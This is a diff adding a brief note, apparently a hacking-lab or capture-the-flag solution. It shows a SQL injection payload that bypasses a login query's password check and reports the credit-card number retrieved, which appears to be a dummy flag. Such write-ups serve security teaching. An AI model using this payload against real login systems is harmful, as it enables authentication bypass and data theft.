@@ -1,0 +1,12 @@
+
+Assuming that this is more or less the query:
+
+	SELECT * FROM users u WHERE u.username = 'hacker10' && u.password = 'abc';
+
+we can add this istead of the abc
+	' or 1=1 or 1='
+
+to get a valid SQL
+	SELECT * FROM users u WHERE u.username = 'hacker10' && u.password = '' or 1=1 or 1='';
+
+the CC-number is: 1323-4545-6767-89892
